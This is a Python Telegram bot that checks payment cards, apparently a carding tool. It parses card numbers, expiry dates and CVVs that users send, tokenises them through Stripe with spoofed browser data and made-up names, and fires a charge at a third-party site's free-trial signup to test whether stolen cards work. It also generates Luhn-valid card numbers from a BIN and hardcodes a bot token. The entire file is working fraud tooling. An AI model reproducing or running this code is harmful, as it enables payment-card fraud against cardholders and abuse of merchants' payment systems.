import re
import json
import time
import random
import string
import hashlib
import requests
import urllib3
from telegram import Update
from telegram.ext import Updater, CommandHandler, MessageHandler, filters, CallbackContext

# Disable insecure request warnings (for Stripe API calls with verify=False)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Config
AUTHORIZED_USERS = [5248903529, 7081556047, 5519289321]
SUPPORT_GROUP = -1002568201025
SUPPORT_USERNAME = '@UNDIFINED_CC'
OWNER = '@SIDIKI_MUSTAFA_92'
BOT_TOKEN = '7928470785:AAHMz54GOWoI-NsbD2zyj0Av_VbnqX7fYzI'

# Check if BOT_TOKEN is replaced
if 'YOUR_BOT_TOKEN_HERE' in BOT_TOKEN:
    print("❌ Please replace BOT_TOKEN with your real bot token before running.")
    exit()

USERS_FILE = 'users.txt'

def save_user(user_id):
    try:
        with open(USERS_FILE, 'r') as f:
            users = f.read().splitlines()
    except FileNotFoundError:
        users = []
    if str(user_id) not in users:
        with open(USERS_FILE, 'a') as f:
            f.write(f"{user_id}\n")

def is_registered(user_id):
    try:
        with open(USERS_FILE, 'r') as f:
            users = f.read().splitlines()
    except FileNotFoundError:
        return False
    return str(user_id) in users

def is_authorized(user_id):
    return user_id in AUTHORIZED_USERS

def extract_cc(text):
    patterns = [
        r'(\d{16})\|(\d{2})\|(\d{2,4})\|(\d{3})',
        r'(\d{16})\s+(\d{2})\s+(\d{2,4})\s+(\d{3})',
        r'(\d{16})\|(\d{2})\/(\d{2,4})\/(\d{3})',
        r'(\d{16})\/(\d{2})\/(\d{2})\/(\d{3})'
    ]
    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            year = match.group(3)
            year = year[-2:] if len(year) == 4 else year
            return {
                'cc': match.group(1),
                'month': match.group(2),
                'year': year,
                'cvv': match.group(4)
            }
    return None

def generate_random_data():
    firstname = ''.join(random.choices(string.ascii_lowercase, k=8)).capitalize()
    lastname = ''.join(random.choices(string.ascii_lowercase, k=8)).capitalize()
    domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com"]
    email = f"{firstname}{random.randint(100,999)}@{random.choice(domains)}"
    return firstname, lastname, email

def check_cc(cc, month, year, cvv):
    firstname, lastname, email = generate_random_data()

    url_token = 'https://api.stripe.com/v1/tokens'
    headers_token = {
        'accept': 'application/json',
        'accept-language': 'en-US',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': 'Mozilla/5.0'
    }
    payload_token = {
        'card[number]': cc,
        'card[exp_month]': month,
        'card[exp_year]': year,
        'card[cvc]': cvv,
        'card[name]': f"{firstname} {lastname}",
        'time_on_page': str(random.randint(30000, 60000)),
        'guid': hashlib.md5(str(random.random()).encode()).hexdigest(),
        'muid': hashlib.md5(str(random.random()).encode()).hexdigest(),
        'sid': hashlib.md5(str(random.random()).encode()).hexdigest(),
        'key': 'pk_test_51RPHEyPKJT4UzOPvV7tWHMGotxjGV6iFmwOBXud6HBmL9NezxGlc0Gk6meBt6U6nrP1diGkPfnCDTIEJLKiFE0yQ00uiHrER4E',
        'payment_user_agent': 'stripe.js/78ef418'
    }

    res_token = requests.post(url_token, headers=headers_token, data=payload_token, verify=False)
    token_data = res_token.json()
    if 'id' not in token_data:
        error_msg = token_data.get('error', {}).get('message', 'Unknown error')
        return {'success': False, 'message': f'Token generation failed: {error_msg}'}

    url_charge = 'https://frethub.com/register/FJKfhw'
    headers_charge = {
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://frethub.com',
        'referer': 'https://frethub.com/free-trial-join/'
    }
    payload_charge = {
        'nonce': hashlib.md5(str(random.random()).encode()).hexdigest(),
        'stripe_action': 'charge',
        'charge_type': 'new',
        'subscription': '1',
        'first_name': firstname,
        'last_name': lastname,
        'email': email,
        'cc_number': cc,
        'cc_expmonth': month,
        'cc_expyear': year,
        'cc_cvc': cvv,
        'stripeToken': token_data['id']
    }

    res_charge = requests.post(url_charge, headers=headers_charge, data=payload_charge)
    text_charge = res_charge.text

    if 'status=success' in text_charge:
        return {'success': True, 'message': 'Card charged successfully'}
    else:
        error = 'Card declined'
        if 'reason=' in text_charge:
            try:
                error = requests.utils.unquote(text_charge.split('reason=')[1].split()[0])
            except:
                pass
        return {'success': False, 'message': error}

def start(update: Update, context: CallbackContext):
    welcome_text = f"""
╔══════════════════════╗
║   𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗖𝗖 𝗕𝗢𝗧   ║
╚══════════════════════╝

▶️ 𝗥𝗲𝗴𝗶𝘀𝘁𝗲𝗿: /register
▶️ 𝗖𝗵𝗲𝗰𝗸 𝗖𝗖: /chk or .chk
▶️ 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: /bin 414720
▶️ 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗼𝗿: /gen 414720

𝗕𝗢𝗧 𝗕𝗬: {OWNER}
"""
    update.message.reply_text(welcome_text)

def register(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    save_user(user_id)
    update.message.reply_text("✅ Registered!\nUse the bot in: " + SUPPORT_USERNAME)

def check_command(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    chat_type = update.message.chat.type
    text = update.message.text

    if not is_registered(user_id):
        update.message.reply_text("❌ Register first using /register")
        return

    if chat_type == 'private' and not is_authorized(user_id):
        update.message.reply_text(f"❌ Use the bot in: {SUPPORT_USERNAME}")
        return

    cc_data = extract_cc(text)
    if not cc_data:
        update.message.reply_text("❌ Invalid CC format!\nUse: 1234567812345678|12|25|123")
        return

    check = check_cc(cc_data['cc'], cc_data['month'], cc_data['year'], cc_data['cvv'])
    emj = "✅" if check['success'] else "❌"
    time_str = time.strftime('%I:%M:%S %p')

    response = f"""
𝗖𝗖: {cc_data['cc']}
𝗘𝘅𝗽: {cc_data['month']}/{cc_data['year']}
𝗖𝗩𝗩: {cc_data['cvv']}

Status: {emj} {check['message']}
Time: {time_str}
"""
    update.message.reply_text(response)

def is_valid_bin(bin_number):
    return bin_number.isdigit() and len(bin_number) >= 6

def get_bin_info(bin_number):
    try:
        response = requests.get(f"https://lookup.binlist.net/{bin_number}")
        if response.status_code == 200:
            return response.json()
    except:
        return None

def generate_card(bin_prefix):
    card = bin_prefix
    while len(card) < 15:
        card += str(random.randint(0, 9))
    total = 0
    reverse_digits = card[::-1]
    for i, digit in enumerate(reverse_digits):
        n = int(digit)
        if i % 2 == 0:
            n *= 2
            if n > 9:
                n -= 9
        total += n
    check_digit = (10 - (total % 10)) % 10
    return card + str(check_digit)

def generate_command(update: Update, context: CallbackContext):
    if not context.args:
        update.message.reply_text("⚠️ BIN daalo. Example: `/gen 414720`", parse_mode='Markdown')
        return
    bin_number = context.args[0]
    if not is_valid_bin(bin_number):
        update.message.reply_text("❌ Invalid BIN.")
        return
    cards = []
    for _ in range(10):
        cc = generate_card(bin_number)
        mm = str(random.randint(1, 12)).zfill(2)
        yy = str(random.randint(25, 30))
        cvv = str(random.randint(100, 999))
        cards.append(f"{cc}|{mm}|{yy}|{cvv}")
    result = "💳 *Generated Cards:*\n" + "\n".join(cards)
    update.message.reply_text(result, parse_mode='Markdown')

def bin_command(update: Update, context: CallbackContext):
    if not context.args:
        update.message.reply_text("⚠️ BIN daalo. Example: `/bin 414720`", parse_mode='Markdown')
        return
    bin_number = context.args[0]
    if not is_valid_bin(bin_number):
        update.message.reply_text("❌ Invalid BIN.")
        return
    bin_info = get_bin_info(bin_number)
    if not bin_info:
        update.message.reply_text("❌ BIN info nahi mila.")
        return
    country_name = bin_info.get('country', {}).get('name', 'Unknown')
    country_emoji = bin_info.get('country', {}).get('emoji', '')
    response = (
        f"🏦 *BIN Info:*\n"
        f"• BIN: `{bin_number}`\n"
        f"• Brand: {bin_info.get('scheme', 'Unknown').title()}\n"
        f"• Type: {bin_info.get('type', 'Unknown').title()}\n"
        f"• Bank: {bin_info.get('bank', {}).get('name', 'Unknown')}\n"
        f"• Country: {country_name} {country_emoji}"
    )
    update.message.reply_text(response, parse_mode='Markdown')

def main():
    updater = Updater(BOT_TOKEN)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler('start', start))
    dp.add_handler(CommandHandler('register', register))
    dp.add_handler(MessageHandler(Filters.regex(r'^(/chk|\.chk)'), check_command))
    dp.add_handler(CommandHandler('gen', generate_command))
    dp.add_handler(CommandHandler('bin', bin_command))

    print("Bot is running...")
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
